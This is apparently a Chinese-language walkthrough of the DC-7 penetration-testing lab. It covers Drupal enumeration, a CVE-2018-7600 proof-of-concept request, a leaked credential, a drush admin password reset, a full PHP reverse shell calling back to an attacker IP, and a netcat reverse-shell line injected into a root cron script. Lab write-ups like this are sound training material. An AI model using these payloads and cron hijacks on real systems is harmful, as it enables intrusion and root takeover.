---
title: DC7
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-19T23:02:04+08:00
categories: 
- 渗透测试
- 靶机练习
---

```
arp-scan -l 
==> 192.168.121.151
```

先用nmap扫描端口

```
nmap -A 192.168.121.151 -T4 -p- 
```

![nmap](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\nmap.png)

能看到端口信息和一些基本目录，访问80端口页面，能看到该网站是基于Drupal搭建的，用dirsearch跑一下目录，和nmap跑出来的效果差不多robots.txt中能看到基本的目录信息

![robots](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\robots.png)

利用网上搜索到的针对性cms工具drupwn进行深度扫描

利用drupwn来枚举站点内容

```
python3 drupwn --mode enum --target http://192.168.121.151
```

![--enum](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\--enum.png)

能看到有两个用户，以及版本为8.x,使用爆破模式看能否检测到漏洞![exploit](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\exploit.png)

能看到有两条cve是可能有用的

![exp2](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\exp2.png)

第一条CVE报错，第二条CVE没有提示信息，我们可以测试第二条CVE-2018-7600，poc如下

```
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: 192.168.121.151
Content-Type: application/x-www-form-urlencoded
Content-Length: 103

form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id
```

但是当我们利用时可以发现是403，查看过后发现是ban掉了register的访问权限，我们得想办法得到用户的其他信息，在github上搜索DC7USER,成功找到git泄露的user信息

```
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
```

使用该账号信息能够成功登录ssh,在当前目录下我们能看到名为backups的文件夹，里面包含了

![dc7user](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\dc7user.png)

两个文件，都经过了gpg加密，想要解密这两个文件，我们需要密钥，继续在靶机上寻找信息，看有没有明文的密码存储

![mbox](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\mbox.png)

mybox中的信息，初步判断为数据库的存储记录，database中的信息被保存到了加密文件中，根据邮件中的提示我们来到/opt/scripts/下查看后门脚本

![opt](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\opt.jpg)

初步尝试解密

```
gpg --output website.sql --decrypt websit.sql.gpg 
```

成功利用泄露的密码解密,压缩包中就是网站的基本信息，没有什么特别之处，websitesql则是有关sql的信息，但是过于多，查看很麻烦

![watchdog](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\watchdog.png)

先尝试登录mysql，看看表，在登陆时被拒绝连接了，尝试修改配置文件，但是没有那个权限，只能从别的地方下手

```
find / -perm -u=s -type f 2>/dev/null
```

查找一番没有可用的suid提权工具，顺带看了下内核信息，都没什么出路，WP中使用的是drush，尝试一下我们确实拥有drush这个脚本命令，上网搜索一下这个工具可以用来干什么，发现该工具可以用来修改密码，格式是这样

```
drush upwd root --password="****"
```

正好前面测出来有admin用户，尝试修改admin密码，但是报错

```
user-password needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal  [error]
environment to run this command.
```

搜索后发现，我们需要在网站根目录下(与settings.php同一目录去修改)

```
cd var/www/html/sites/default
drush upwd admin --password='admin'
```

成功修改了密码，尝试登录，成功进入admin后台

![admin](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\admin.png)

我们能利用的地方就只有添加文章一处位置，但是该处文章内容均被修饰，但是我们有权限可以自行添加功能，手动下载php filter模块

如此我们就能在添加文章处通过php代码执行命令了，接下来拿shell,尝试了几个shell,基本上都是连上就断开了，下面这个shell连接成功

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.121.135';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

![www-data](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\www-data.png)

接下来提权，没有sudo命令，看看suid,和dc7user能使用的相同，没有别的命令，尝试使用CVE-2019-13272内核漏洞进行提权，但是由于编译器版本问题，我们的脚本仍然没有办法在靶机上执行

```
www-data@dc-7:/tmp$ ./dc7
./dc7
./dc7: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./dc7)
./dc7: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./dc7)
```

看了看WP，是利用计划任务进行提权，由于/opt/scripts/backups.sh文件仅www-data和root能够写入，这也是为什么我们需要获取www-data的shell的原因

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.121.135 6666 >/tmp/f" >> backups.sh
```

root用户每15分钟执行一次该文件

![root](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\root.png)

成功拿到shell后读取flag即可

![flag](E:\笔记软件\笔记\渗透测试\靶机练习\DC7图库\flag.png)

## 总结：

可能是没有把靶机当作真实环境来做，没有想到搜集用户信息还会有git泄露，以及在查看脚本文件时去猜测字段内容，是否具有定时任务，关键的文件最好是去查看文件的权限来确定下一步的目标